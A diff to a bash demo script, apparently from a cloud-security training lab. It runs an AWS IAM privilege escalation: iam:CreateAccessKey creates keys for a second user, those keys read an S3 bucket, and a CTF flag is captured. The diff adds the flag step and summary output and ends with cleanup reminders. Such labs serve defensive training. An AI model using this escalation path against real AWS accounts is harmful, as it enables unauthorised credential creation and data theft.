@@ -202,47 +202,60 @@ echo -e "${YELLOW}Contents of sensitive file:${NC}"
 cat $DOWNLOAD_FILE
 echo ""
 
-# Summary
-echo -e "${GREEN}========================================${NC}"
-echo -e "${GREEN}Attack Summary${NC}"
-echo -e "${GREEN}========================================${NC}"
-echo -e "Starting Point: User ${YELLOW}$PRIVESC_USER${NC}"
-echo -e "Step 1: Created access keys for ${YELLOW}$BUCKET_ACCESS_USER${NC}"
-echo -e "Step 2: Switched to new credentials"
-echo -e "Step 3: Gained access to ${YELLOW}$BUCKET_NAME${NC}"
-echo ""
-echo -e "${YELLOW}Attack Path:${NC}"
-echo -e "  $PRIVESC_USER → (CreateAccessKey) → $BUCKET_ACCESS_USER → $BUCKET_NAME"
+# [EXPLOIT] Step 10: Capture the CTF flag
+echo -e "${YELLOW}Step 10: Capturing CTF flag from S3 bucket${NC}"
+show_attack_cmd "Attacker" "aws s3 cp s3://$BUCKET_NAME/flag.txt -"
+FLAG_VALUE=$(aws s3 cp s3://$BUCKET_NAME/flag.txt - 2>/dev/null)
+
+if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
+    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
+else
+    echo -e "${RED}✗ Failed to read flag from s3://$BUCKET_NAME/flag.txt${NC}"
+    exit 1
+fi
 echo ""
 
+# Restore helpful permissions for manual exploration
+restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
+
+echo -e "\n${GREEN}========================================${NC}"
+echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
+echo -e "${GREEN}========================================${NC}"
+echo -e "\n${YELLOW}Attack Summary:${NC}"
+echo "1. Started as: $PRIVESC_USER (limited permissions, no S3 access)"
+echo "2. Created access keys for $BUCKET_ACCESS_USER using iam:CreateAccessKey"
+echo "3. Switched to new credentials for bucket access user"
+echo "4. Discovered and accessed target bucket: $BUCKET_NAME"
+echo "5. Captured CTF flag from s3://$BUCKET_NAME/flag.txt: $FLAG_VALUE"
+
+echo -e "\n${YELLOW}Attack Path:${NC}"
+echo -e "  $PRIVESC_USER → (iam:CreateAccessKey) → $BUCKET_ACCESS_USER → $BUCKET_NAME"
+
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
-    echo -e "${YELLOW}Attack Commands:${NC}"
+    echo -e "\n${YELLOW}Attack Commands:${NC}"
     for cmd in "${ATTACK_COMMANDS[@]}"; do
         echo -e "  ${CYAN}\$ ${cmd}${NC}"
     done
 fi
-echo ""
 
-echo -e "${GREEN}Downloaded file location: $DOWNLOAD_FILE${NC}"
-echo -e "${GREEN}New access key ID: $NEW_ACCESS_KEY_ID${NC}"
+echo -e "\n${YELLOW}Attack Artifacts:${NC}"
+echo "- New IAM access key: $NEW_ACCESS_KEY_ID"
+echo "- Downloaded file: $DOWNLOAD_FILE"
+
 echo ""
 
 # Standardized test results output
 echo "TEST_RESULT:prod_one_hop_to_bucket_iam_002_iam_createaccesskey:SUCCESS"
 echo "TEST_DETAILS:prod_one_hop_to_bucket_iam_002_iam_createaccesskey:Successfully accessed S3 bucket via CreateAccessKey escalation"
-echo "TEST_METRICS:prod_one_hop_to_bucket_iam_002_iam_createaccesskey:access_key_created=true,bucket_accessed=true,data_exfiltrated=true"
+echo "TEST_METRICS:prod_one_hop_to_bucket_iam_002_iam_createaccesskey:access_key_created=true,bucket_accessed=true,data_exfiltrated=true,flag_captured=true"
 echo ""
 
-# Cleanup instructions
 echo -e "${RED}IMPORTANT: Run cleanup_attack.sh to delete the created access keys${NC}"
 echo -e "${RED}Access Key ID to delete: $NEW_ACCESS_KEY_ID${NC}"
 echo ""
 echo -e "${YELLOW}To clean up:${NC}"
 echo "  ./cleanup_attack.sh or use the plabs TUI/CLI"
 echo ""
-
-# Restore helpful permissions for manual exploration
-restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
 
 # Mark demo as active for plabs tracking
 touch "$(dirname "$0")/.demo_active"
